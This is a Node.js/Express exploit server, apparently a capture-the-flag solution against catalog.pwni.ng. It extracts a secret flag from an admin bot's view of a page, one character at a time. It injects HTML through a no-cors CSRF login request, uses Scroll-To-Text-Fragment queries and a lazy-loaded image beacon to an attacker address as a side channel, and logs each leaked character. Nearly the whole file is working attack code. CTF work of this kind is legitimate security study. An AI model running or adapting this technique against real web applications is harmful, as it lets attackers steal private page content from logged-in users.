const bl = require("beautiful-log");
const express = require("express");

bl.init("pwn", "console");
const log = bl.make("pwn");

const app = express();

let alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}";
let flag = "PCTF{";
let phase = 0;
let currentAlphabet = alphabet;
let yesAlphabet = alphabet;
let noAlphabet = alphabet;
let targetUrl = "http://catalog.pwni.ng";
let targetIssue = 3; // <-- 3 for the real flag, change to the issue id for testing
let attackUrl = "http://1.2.3.4:12345" // <-- attacker address here

app.get("/yeet", (req, res) => {
	// This is the endpoint we use to detect a lazy-loaded image, i.e. that the bot has scrolled.
	currentAlphabet = yesAlphabet;
	log(`<green>Image loaded!</green>\n<gray>New alphabet: ${currentAlphabet}</gray>`);
	res.status(404).send();
});

app.use("/", (req, res) => {
	if (req.path === "/favicon.ico") {
		res.status(404).send();
		return;
	}

	switch (phase) {
		case 0: {
			if (currentAlphabet !== yesAlphabet) {
				log(`<red>No image loaded!</red>\n<gray>New alphabet: ${currentAlphabet}</gray>`);
				currentAlphabet = noAlphabet;
			}

			if (currentAlphabet.length === 1) {
				flag += currentAlphabet.charAt(0);
				log(`Flag updated: <cyan>${flag}</cyan>`)
				if (flag.endsWith("}")) {
					process.exit(0);
				}
				currentAlphabet = alphabet;

				// If you're testing with the real flag but a non-admin viewer, you need to omit "A" as a possibility when the last two characters are "OR".
				// This is because there's a button with the label "submit for admin approval", so you get stuck on the path starting in the middle of the word "for".
				// However, this button doesn't appear if you're logged in as an admin, so you wouldn't end up having this problem.
				// (In fact, the flag was specifically chosen to not have conflicts like this when viewed by an admin.)

				// if (flag.endsWith("OR")) {
				// 	currentAlphabet = currentAlphabet.substring(1);
				// }
			}

			let yesLen = Math.floor(currentAlphabet.length / 2);
			yesAlphabet = currentAlphabet.substring(0, yesLen);
			noAlphabet = currentAlphabet.substring(yesLen);

			// 0.2s seems to be long enough to consistently trigger the lazy-load, and short enough that we don't lose the user activation.
			let content = `<meta http-equiv="refresh" content="0.2;url=${attackUrl}" /></b></div>${"<h1></h1>".repeat(500)}<img src="${attackUrl}/yeet" loading="lazy" /><em><div><b>`;
			let test = yesAlphabet.split("").map((c) => `text=${flag.charAt(flag.length - 2)}-,${flag.charAt(flag.length - 1)},-${c}`).join("&");
			log(`Alphabet: <green>${yesAlphabet}</green> <red>${noAlphabet}</red>`);
			log(`STTF: <gray>${test}</gray>`);

			res.send(`
Redirect happening momentarily
<script>
fetch("${targetUrl}/user.php", {
	method: "POST",
	mode: "no-cors",
	credentials: "include",
	headers: {
		"content-type": "application/x-www-form-urlencoded"
	},
	body: "username=${encodeURIComponent(content)}&password=fail&action=login"
}).then(() => {
	window.location = ("${targetUrl}/issue.php?id=${targetIssue}#:~:${test}");
});
</script>
			`);

			phase++;
			break;
		}

		case 1: {
			// The CSRF redirects to Referer, so we need to ignore every-other request.
			res.send("cool story");
			phase = 0;
			break;
		}
	}
});

app.listen(12345);
